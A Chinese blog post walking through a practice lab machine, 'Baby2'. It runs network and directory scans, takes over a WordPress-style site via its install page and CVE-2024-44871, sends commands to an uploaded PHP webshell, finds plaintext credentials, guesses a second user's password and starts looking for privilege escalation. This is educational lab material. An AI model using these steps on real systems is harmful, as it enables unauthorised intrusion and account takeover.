@@ -1,0 +1,231 @@
+<!doctype html><html lang=zh-cn><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><title>群友靶机Baby2 - Twansh's blog</title><link rel=icon href=/logo.png><script>(function(){localStorage.removeItem("flavor-theme");var t=window.matchMedia("(prefers-color-scheme: dark)"),e=sessionStorage.getItem("flavor-theme-override");if(e==="light"||e==="dark"){document.documentElement.setAttribute("data-theme",e);return}document.documentElement.setAttribute("data-theme",t.matches?"dark":"light")})()</script><link rel=preload as=font type=font/woff2 href=/fonts/tsanger-jinkai02/20307ec77575b65807a8b0c5b7201f43.woff2 crossorigin><link rel=preload as=style href=/fonts/tsanger-jinkai02/result.css onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=/fonts/tsanger-jinkai02/result.css></noscript><link rel=stylesheet href=/scss/main.min.f9483bf4231821718c79757993df7674f414a796ac0bd206f89cc6c81e39cb27.css><meta name=description content="baby系列第二弹"><meta name=author content="Twansh"><meta name=robots content="index,follow,max-image-preview:large"><meta name=keywords content="Cyberspace Security,CTF,Web Security,Penetration Testing,Offensive,靶机"><link rel=canonical href=https://3a0.top/p/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BAbaby2/><meta property="og:site_name" content="Twansh's blog"><meta property="og:title" content="群友靶机Baby2 - Twansh's blog"><meta property="og:description" content="baby系列第二弹"><meta property="og:type" content="article"><meta property="og:url" content="https://3a0.top/p/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BAbaby2/"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://3a0.top/logo.png"><meta property="og:image:alt" content="群友靶机Baby2"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="群友靶机Baby2 - Twansh's blog"><meta name=twitter:description content="baby系列第二弹"><meta name=twitter:image content="https://3a0.top/logo.png"><meta property="article:published_time" content="2025-10-15T19:05:18Z"><meta property="article:modified_time" content="2025-10-15T19:05:18Z"><meta property="article:section" content="Offensive"><meta property="article:tag" content="靶机"><script type=application/ld+json>{"@context":"https://schema.org","@graph":[{"@id":"https://3a0.top/#website","@type":"WebSite","description":"Cyberspace Security / CTF / Web 安全，记录学习和生活。","inLanguage":"zh-cn","name":"Twansh's blog","url":"https://3a0.top/"},{"@id":"https://3a0.top/about/#author","@type":"Person","email":"eminemgcxwlp@gmail.com","name":"Twansh","sameAs":["https://github.com/GCXWLP"],"url":"https://3a0.top/about/"},{"@id":"https://3a0.top/p/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BAbaby2/#article","@type":"BlogPosting","author":{"@id":"https://3a0.top/about/#author"},"dateModified":"2025-10-15T19:05:18Z","datePublished":"2025-10-15T19:05:18Z","description":"baby系列第二弹","headline":"群友靶机Baby2","image":["https://3a0.top/logo.png"],"inLanguage":"zh-cn","isPartOf":{"@id":"https://3a0.top/#website"},"keywords":["Offensive","靶机"],"mainEntityOfPage":"https://3a0.top/p/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BAbaby2/","url":"https://3a0.top/p/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BAbaby2/"},{"@id":"https://3a0.top/p/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BAbaby2/#breadcrumb","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","item":"https://3a0.top/","name":"Home","position":1},{"@type":"ListItem","item":"https://3a0.top/p/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BAbaby2/","name":"群友靶机Baby2","position":2}]}]}</script></head><body><nav class=navbar id=navbar><div class=navbar__inner><a class=navbar__brand href=/><span>Twansh's blog</span></a><div class=navbar__right><ul class=navbar__links id=nav-links><li><a href=/><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M3 9l9-7 9 7v11a2 2 0 01-2 2H5a2 2 0 01-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg>
+<span>Home</span></a></li><li><a href=/about/><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
+<span>About</span></a></li><li><a href=/archives/><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polyline points="21 8 21 21 3 21 3 8"/><rect x="1" y="3" width="22" height="5"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
+<span>Archives</span></a></li><li><a href=/links/><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71"/></svg>
+<span>Links</span></a></li><li><a href=/travel/><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0118 0z"/><circle cx="12" cy="10" r="3"/></svg>
+<span>Travel</span></a></li></ul><button class=navbar__btn id=search-btn type=button aria-label=Search>
+<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
+</button>
+<button class=navbar__btn id=theme-toggle type=button aria-label="Toggle theme">
+<svg class="icon-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
+<svg class="icon-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
+</button>
+<button class="navbar__btn navbar__hamburger" id=hamburger type=button aria-label=Menu>
+<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="18" x2="21" y2="18"/></svg></button></div></div></nav><div class=site-content><div class=post-layout><article class="post-layout__content post-single"><header class=post-single__header><div class=post-single__meta><time datetime=2025-10-15 data-pagefind-meta=date[datetime]>Oct 15, 2025</time>
+<span class=sep>·</span>
+<span>5 min read</span>
+<span class=sep>·</span>
+<span>879 words</span>
+<span class=sep>·</span>
+<a href=/categories/offensive/ class=post-single__category data-pagefind-filter=category>Offensive</a></div><h1 class=post-single__title data-pagefind-meta=title>群友靶机Baby2</h1></header><div class=article-content data-pagefind-body><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>root㉿kali<span class=o>)</span>-<span class=o>[</span>/home/kali<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─# arp-scan -l
+</span></span><span class=line><span class=cl>Interface: eth0, type: EN10MB, MAC: 00:0c:29:66:2a:e1, IPv4: 192.168.56.102
+</span></span><span class=line><span class=cl>WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
+</span></span><span class=line><span class=cl>WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
+</span></span><span class=line><span class=cl>Starting arp-scan 1.10.0 with <span class=m>256</span> hosts <span class=o>(</span>https://github.com/royhills/arp-scan<span class=o>)</span>
+</span></span><span class=line><span class=cl>192.168.56.1    0a:00:27:00:00:0d       <span class=o>(</span>Unknown: locally administered<span class=o>)</span>
+</span></span><span class=line><span class=cl>192.168.56.100  08:00:27:79:15:6b       <span class=o>(</span>Unknown<span class=o>)</span>
+</span></span><span class=line><span class=cl>192.168.56.108  08:00:27:9a:b0:ac       <span class=o>(</span>Unknown<span class=o>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=m>3</span> packets received by filter, <span class=m>0</span> packets dropped by kernel
+</span></span><span class=line><span class=cl>Ending arp-scan 1.10.0: <span class=m>256</span> hosts scanned in 1.889 seconds <span class=o>(</span>135.52 hosts/sec<span class=o>)</span>. <span class=m>3</span> responded
+</span></span><span class=line><span class=cl>                                                                                                                                        
+</span></span><span class=line><span class=cl>┌──<span class=o>(</span>root㉿kali<span class=o>)</span>-<span class=o>[</span>/home/kali<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─# nmap -sC -sV -p- 192.168.56.108
+</span></span><span class=line><span class=cl>Starting Nmap 7.95 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2025-10-22 13:55 +08
+</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 192.168.56.108
+</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.00062s latency<span class=o>)</span>.
+</span></span><span class=line><span class=cl>Not shown: <span class=m>65533</span> closed tcp ports <span class=o>(</span>reset<span class=o>)</span>
+</span></span><span class=line><span class=cl>PORT   STATE SERVICE VERSION
+</span></span><span class=line><span class=cl>22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 <span class=o>(</span>protocol 2.0<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span> ssh-hostkey: 
+</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>3072</span> f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 <span class=o>(</span>RSA<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d <span class=o>(</span>ECDSA<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_  <span class=m>256</span> 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb <span class=o>(</span>ED25519<span class=o>)</span>
+</span></span><span class=line><span class=cl>80/tcp open  http    Apache httpd 2.4.62 <span class=o>((</span>Debian<span class=o>))</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Site doesn<span class=err>&#39;</span>t have a title <span class=o>(</span>text/html<span class=o>)</span>.
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Apache/2.4.62 <span class=o>(</span>Debian<span class=o>)</span>
+</span></span><span class=line><span class=cl>MAC Address: 08:00:27:9A:B0:AC <span class=o>(</span>PCS Systemtechnik/Oracle VirtualBox virtual NIC<span class=o>)</span>
+</span></span><span class=line><span class=cl>Service Info: OS: Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 21.24 seconds
+</span></span><span class=line><span class=cl>                                                                                                                                        
+</span></span><span class=line><span class=cl>┌──<span class=o>(</span>root㉿kali<span class=o>)</span>-<span class=o>[</span>/home/kali<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─# gobuster dir -u http://192.168.56.113 -w /usr/share/wordlists/dirbuster/                      
+</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
+</span></span><span class=line><span class=cl>Gobuster v3.8
+</span></span><span class=line><span class=cl>by OJ Reeves <span class=o>(</span>@TheColonial<span class=o>)</span> <span class=p>&amp;</span> Christian Mehlmauer <span class=o>(</span>@firefart<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Url:                     http://192.168.56.113
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Method:                  GET
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Threads:                 <span class=m>10</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Wordlist:                /usr/share/wordlists/dirbuster/
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Negative Status codes:   <span class=m>404</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> User Agent:              gobuster/3.8
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Timeout:                 <span class=nv>10s</span>
+</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
+</span></span><span class=line><span class=cl>Starting gobuster in directory enumeration <span class=nv>mode</span>
+</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
+</span></span><span class=line><span class=cl>Progress: <span class=m>0</span> / <span class=m>1</span> <span class=o>(</span>0.00%<span class=o>)</span>^Z
+</span></span><span class=line><span class=cl>zsh: suspended  gobuster dir -u http://192.168.56.113 -w /usr/share/wordlists/dirbuster/
+</span></span><span class=line><span class=cl>                                                                                                                                        
+</span></span><span class=line><span class=cl>┌──<span class=o>(</span>root㉿kali<span class=o>)</span>-<span class=o>[</span>/home/kali<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─# ls  /usr/share/wordlists/dirbuster/
+</span></span><span class=line><span class=cl>apache-user-enum-1.0.txt  directories.jbrofuzz    directory-list-2.3-medium.txt  directory-list-lowercase-2.3-medium.txt
+</span></span><span class=line><span class=cl>apache-user-enum-2.0.txt  directory-list-1.0.txt  directory-list-2.3-small.txt   directory-list-lowercase-2.3-small.txt
+</span></span><span class=line><span class=cl>                                                                                                                                        
+</span></span><span class=line><span class=cl>┌──<span class=o>(</span>root㉿kali<span class=o>)</span>-<span class=o>[</span>/home/kali<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─# gobuster dir -u http://192.168.56.113 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
+</span></span><span class=line><span class=cl>Gobuster v3.8
+</span></span><span class=line><span class=cl>by OJ Reeves <span class=o>(</span>@TheColonial<span class=o>)</span> <span class=p>&amp;</span> Christian Mehlmauer <span class=o>(</span>@firefart<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Url:                     http://192.168.56.113
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Method:                  GET
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Threads:                 <span class=m>10</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Negative Status codes:   <span class=m>404</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> User Agent:              gobuster/3.8
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Timeout:                 <span class=nv>10s</span>
+</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
+</span></span><span class=line><span class=cl>Starting gobuster in directory enumeration <span class=nv>mode</span>
+</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
+</span></span><span class=line><span class=cl>Progress: <span class=m>0</span> / <span class=m>1</span> <span class=o>(</span>0.00%<span class=o>)</span>
+</span></span><span class=line><span class=cl>2025/10/22 13:59:02 error on running gobuster on http://192.168.56.113/: unable to connect to http://192.168.56.113/: Get <span class=s2>&#34;http://192.168.56.113/&#34;</span>: dial tcp 192.168.56.113:80: connect: no route to host
+</span></span><span class=line><span class=cl>                                                                                                                                        
+</span></span><span class=line><span class=cl>┌──<span class=o>(</span>root㉿kali<span class=o>)</span>-<span class=o>[</span>/home/kali<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─# gobuster dir -u http://192.168.56.108 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt      
+</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
+</span></span><span class=line><span class=cl>Gobuster v3.8
+</span></span><span class=line><span class=cl>by OJ Reeves <span class=o>(</span>@TheColonial<span class=o>)</span> <span class=p>&amp;</span> Christian Mehlmauer <span class=o>(</span>@firefart<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Url:                     http://192.168.56.108
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Method:                  GET
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Threads:                 <span class=m>10</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Negative Status codes:   <span class=m>404</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> User Agent:              gobuster/3.8
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Timeout:                 <span class=nv>10s</span>
+</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
+</span></span><span class=line><span class=cl>Starting gobuster in directory enumeration <span class=nv>mode</span>
+</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
+</span></span><span class=line><span class=cl>/wordpress            <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 320<span class=o>]</span> <span class=o>[</span>--&gt; http://192.168.56.108/wordpress/<span class=o>]</span>
+</span></span><span class=line><span class=cl>/server-status        <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 279<span class=o>]</span>
+</span></span><span class=line><span class=cl>Progress: <span class=m>220558</span> / <span class=m>220558</span> <span class=o>(</span>100.00%<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
+</span></span><span class=line><span class=cl><span class=nv>Finished</span>
+</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
+</span></span><span class=line><span class=cl>                                                                                                                                        
+</span></span><span class=line><span class=cl>┌──<span class=o>(</span>root㉿kali<span class=o>)</span>-<span class=o>[</span>/home/kali<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─# gobuster dir -u http://192.168.56.108/wordpress -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
+</span></span><span class=line><span class=cl>Gobuster v3.8
+</span></span><span class=line><span class=cl>by OJ Reeves <span class=o>(</span>@TheColonial<span class=o>)</span> <span class=p>&amp;</span> Christian Mehlmauer <span class=o>(</span>@firefart<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Url:                     http://192.168.56.108/wordpress
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Method:                  GET
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Threads:                 <span class=m>10</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Negative Status codes:   <span class=m>404</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> User Agent:              gobuster/3.8
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Timeout:                 <span class=nv>10s</span>
+</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
+</span></span><span class=line><span class=cl>Starting gobuster in directory enumeration <span class=nv>mode</span>
+</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
+</span></span><span class=line><span class=cl>/admin                <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 326<span class=o>]</span> <span class=o>[</span>--&gt; http://192.168.56.108/wordpress/admin/<span class=o>]</span>
+</span></span><span class=line><span class=cl>/plugins              <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 328<span class=o>]</span> <span class=o>[</span>--&gt; http://192.168.56.108/wordpress/plugins/<span class=o>]</span>
+</span></span><span class=line><span class=cl>/cms                  <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 324<span class=o>]</span> <span class=o>[</span>--&gt; http://192.168.56.108/wordpress/cms/<span class=o>]</span>
+</span></span><span class=line><span class=cl>/tmp                  <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 324<span class=o>]</span> <span class=o>[</span>--&gt; http://192.168.56.108/wordpress/tmp/<span class=o>]</span>
+</span></span><span class=line><span class=cl>/layouts              <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 328<span class=o>]</span> <span class=o>[</span>--&gt; http://192.168.56.108/wordpress/layouts/<span class=o>]</span>
+</span></span><span class=line><span class=cl>/docu                 <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 325<span class=o>]</span> <span class=o>[</span>--&gt; http://192.168.56.108/wordpress/docu/<span class=o>]</span>
+</span></span><span class=line><span class=cl>/kategorien           <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 331<span class=o>]</span> <span class=o>[</span>--&gt; http://192.168.56.108/wordpress/kategorien/<span class=o>]</span>
+</span></span><span class=line><span class=cl>Progress: <span class=m>220558</span> / <span class=m>220558</span> <span class=o>(</span>100.00%<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
+</span></span><span class=line><span class=cl><span class=nv>Finished</span>
+</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
+</span></span><span class=line><span class=cl>                                                                                                                                        
+</span></span><span class=line><span class=cl>┌──<span class=o>(</span>root㉿kali<span class=o>)</span>-<span class=o>[</span>/home/kali<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─# gobuster dir -u http://192.168.56.108/wordpress -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,php3,txt,html,bk,bak,zip,tar,gz,shtml
+</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
+</span></span><span class=line><span class=cl>Gobuster v3.8
+</span></span><span class=line><span class=cl>by OJ Reeves <span class=o>(</span>@TheColonial<span class=o>)</span> <span class=p>&amp;</span> Christian Mehlmauer <span class=o>(</span>@firefart<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Url:                     http://192.168.56.108/wordpress
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Method:                  GET
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Threads:                 <span class=m>10</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Negative Status codes:   <span class=m>404</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> User Agent:              gobuster/3.8
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Extensions:              php,php3,txt,html,zip,tar,bk,bak,gz,shtml
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Timeout:                 <span class=nv>10s</span>
+</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
+</span></span><span class=line><span class=cl>Starting gobuster in directory enumeration <span class=nv>mode</span>
+</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
+</span></span><span class=line><span class=cl>/index.php            <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 7197<span class=o>]</span>
+</span></span><span class=line><span class=cl>/admin                <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 326<span class=o>]</span> <span class=o>[</span>--&gt; http://192.168.56.108/wordpress/admin/<span class=o>]</span>
+</span></span><span class=line><span class=cl>/plugins              <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 328<span class=o>]</span> <span class=o>[</span>--&gt; http://192.168.56.108/wordpress/plugins/<span class=o>]</span>
+</span></span><span class=line><span class=cl>/update.php           <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 0<span class=o>]</span>
+</span></span><span class=line><span class=cl>/install.php          <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 6943<span class=o>]</span>
+</span></span><span class=line><span class=cl>/cms                  <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 324<span class=o>]</span> <span class=o>[</span>--&gt; http://192.168.56.108/wordpress/cms/<span class=o>]</span>
+</span></span><span class=line><span class=cl>/readme.txt           <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 594<span class=o>]</span>
+</span></span><span class=line><span class=cl>/tmp                  <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 324<span class=o>]</span> <span class=o>[</span>--&gt; http://192.168.56.108/wordpress/tmp/<span class=o>]</span>
+</span></span><span class=line><span class=cl>/layouts              <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 328<span class=o>]</span> <span class=o>[</span>--&gt; http://192.168.56.108/wordpress/layouts/<span class=o>]</span>
+</span></span><span class=line><span class=cl>/gpl.txt              <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 17996<span class=o>]</span>
+</span></span><span class=line><span class=cl>/docu                 <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 325<span class=o>]</span> <span class=o>[</span>--&gt; http://192.168.56.108/wordpress/docu/<span class=o>]</span>
+</span></span></code></pre></div><p>信息大调查</p><p>进wordpress，发现一个服务，大调查cve，发现一个nday<br><a href=https://github.com/sec-fortress/Exploits/tree/main/CVE-2024-44871>参考文献</a></p><p>深度扫一手，发现install.php，我们先去安装一手，安装过程中可以改密码，这里我就直接改了，然后就可以登录后台了</p><p>进后台之后复现这个cve</p><p>发现不能更改文件名，丢给ds分析，知道了双击文件名就可以更改文件名</p><p>然后访问</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>http://192.168.56.108/wordpress/kategorien/Willkommen/dateien/rev.php?cmd<span class=o>=</span>ls
+</span></span></code></pre></div><p>发现成功回显，然后可以执行任意命令</p><p>在/home/aristore目录下发现user的flag，直接rce</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>flag<span class=o>{</span>user-b6cc0757c4a3108795d0803f9e82b9d3<span class=o>}</span>
+</span></span><span class=line><span class=cl>aristore:aristorearistore
+</span></span></code></pre></div><p>还有登录的账号密码，ssh连上</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>root㉿kali<span class=o>)</span>-<span class=o>[</span>/home/kali<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─# ssh aristore@192.168.56.108         
+</span></span><span class=line><span class=cl>aristore@192.168.56.108<span class=err>&#39;</span>s password: 
+</span></span><span class=line><span class=cl>Linux Baby2 4.19.0-27-amd64 <span class=c1>#1 SMP Debian 4.19.316-1 (2024-06-25) x86_64</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>The programs included with the Debian GNU/Linux system are free software<span class=p>;</span>
+</span></span><span class=line><span class=cl>the exact distribution terms <span class=k>for</span> each program are described in the
+</span></span><span class=line><span class=cl>individual files in /usr/share/doc/*/copyright.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+</span></span><span class=line><span class=cl>permitted by applicable law.
+</span></span><span class=line><span class=cl>aristore@Baby2:~$ id
+</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>1000<span class=o>(</span>aristore<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>1000<span class=o>(</span>aristore<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>1000<span class=o>(</span>aristore<span class=o>)</span>
+</span></span></code></pre></div><p>然后我们可以看到，home目录下依然有一个用户tuf，所以可以尝试切换到tuf，因为aristore的密码是两遍，所以tuf的密码尝试是两遍，成功登录</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>tuf@Baby2:/home/aristore$ id
+</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>1001<span class=o>(</span>tuf<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>1001<span class=o>(</span>tuf<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>1001<span class=o>(</span>tuf<span class=o>)</span>
+</span></span></code></pre></div><p>这里也是了解到 dpkg -V排查了</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>tuf@Baby2:/home/aristore$ dpkg -V
+</span></span><span class=line><span class=cl>??5?????? c /etc/irssi.conf
+</span></span><span class=line><span class=cl>??5?????? c /etc/apache2/apache2.conf
+</span></span><span class=line><span class=cl>??5??????   /bin/cat
